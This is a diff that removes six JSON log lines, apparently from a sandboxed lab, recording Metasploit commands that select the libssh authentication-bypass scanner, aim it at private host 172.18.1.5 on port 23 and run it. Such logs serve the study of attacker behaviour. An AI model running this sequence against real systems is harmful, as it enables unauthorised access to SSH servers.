@@ -1,6 +1,0 @@
-{"sandbox_id": "401", "timestamp_str": "2019-08-14T15:41:44.249417Z", "cmd_type": "msf-command", "cmd": "search libssh"}
-{"sandbox_id": "401", "timestamp_str": "2019-08-14T15:41:55.537355Z", "cmd_type": "msf-command", "cmd": "use auxiliary/scanner/ssh/libssh_auth_bypass"}
-{"sandbox_id": "401", "timestamp_str": "2019-08-14T15:41:58.709298Z", "cmd_type": "msf-command", "cmd": "show options"}
-{"sandbox_id": "401", "timestamp_str": "2019-08-14T15:42:20.222042Z", "cmd_type": "msf-command", "cmd": "set RHOSTS 172.18.1.5"}
-{"sandbox_id": "401", "timestamp_str": "2019-08-14T15:42:36.478195Z", "cmd_type": "msf-command", "cmd": "set RPORT 23"}
-{"sandbox_id": "401", "timestamp_str": "2019-08-14T15:42:38.321868Z", "cmd_type": "msf-command", "cmd": "run"}
